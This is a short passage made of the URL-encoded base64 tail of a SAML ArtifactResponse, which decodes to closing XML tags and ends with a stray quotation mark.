2FtbDpBc3NlcnRpb24%2BPC9zYW1scDpSZXNwb25zZT48L3NhbWxwOkFydGlmYWN0UmVzcG9uc2U%2B"
